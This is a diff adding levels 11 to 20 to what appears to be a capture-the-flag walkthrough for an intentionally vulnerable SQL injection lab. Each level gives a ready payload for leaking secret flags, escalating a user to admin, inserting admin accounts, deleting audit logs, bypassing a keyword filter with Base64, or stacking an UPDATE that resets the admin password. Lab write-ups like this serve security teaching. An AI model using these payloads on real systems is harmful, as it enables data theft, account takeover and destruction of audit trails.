@@ -100,3 +100,107 @@ Payload:
 ```
 
 > Explanation: Uses semicolon ; to execute a second SQL statement (UPDATE).
+
+## Level 11: Column Picker (SELECT List Injection)
+
+Goal: Expose hidden flag by injecting into the SELECT column list.
+Payload (cols):
+```
+name, (SELECT flag FROM secrets)
+```
+
+Explanation: The injected subquery becomes a visible column in the result set.
+
+## Level 12: Ranking Engine (Expression Injection)
+
+Goal: Leak secret data via computed column.
+Payload (rank):
+```
+(SELECT flag FROM secrets)
+```
+
+Explanation: The injected expression is evaluated as the ranking score and rendered on screen.
+
+## Level 13: Batch Selector (IN Clause Injection)
+
+Goal: UNION into the IN clause to reveal the flag.
+Payload (ids):
+```
+1) UNION SELECT id, flag, 1 FROM secrets--
+```
+
+Explanation: Closes the IN list and appends a UNION SELECT.
+
+## Level 14: Wildcard Escape (ESCAPE Clause Injection)
+
+Goal: Inject via the ESCAPE parameter.
+Payload (esc):
+```
+x' OR 1=1 UNION SELECT flag, flag FROM secrets--
+```
+
+Explanation: Breaks out of the ESCAPE literal and unions the secrets table.
+
+## Level 15: Profile Update (UPDATE Injection)
+
+Goal: Escalate user role to admin by injecting into SET clause.
+Payload (status):
+```
+ok', role='admin
+```
+
+Explanation: Adds a new assignment to the UPDATE statement.
+
+## Level 16: Signup Service (INSERT Injection)
+
+Goal: Create a new admin account during signup.
+Payload (username):
+```
+hacker', 'pw', 'admin', 'active')--
+```
+
+Explanation: Closes the VALUES list early and injects admin role values.
+
+## Level 17: Audit Cleanup (DELETE Injection)
+
+Goal: Wipe all audit logs.
+Payload (log_id):
+```
+1 OR 1=1
+```
+
+Explanation: Deletes every row by forcing the WHERE clause to always be true.
+
+## Level 18: Nested Query (Subquery Injection)
+
+Goal: Expose the flag from inside a nested SELECT.
+Payload (ref):
+```
+' UNION SELECT flag FROM secrets--
+```
+
+Explanation: The injected UNION runs inside the subquery and returns the flag.
+
+## Level 19: Encoded Filter (Base64 Bypass)
+
+Goal: Bypass keyword filter by sending Base64-encoded payload.
+Decoded payload:
+```
+%' UNION SELECT id, flag, 1 FROM secrets--
+```
+Base64:
+```
+JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t
+```
+
+Explanation: The app blocks raw keywords but decodes and executes the payload.
+
+## Level 20: Report Builder (Script Injection)
+
+Goal: Modify system state via the report filter.
+Payload (filter):
+```
+1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--
+```
+
+Explanation: The report builder uses executescript(), allowing stacked statements.
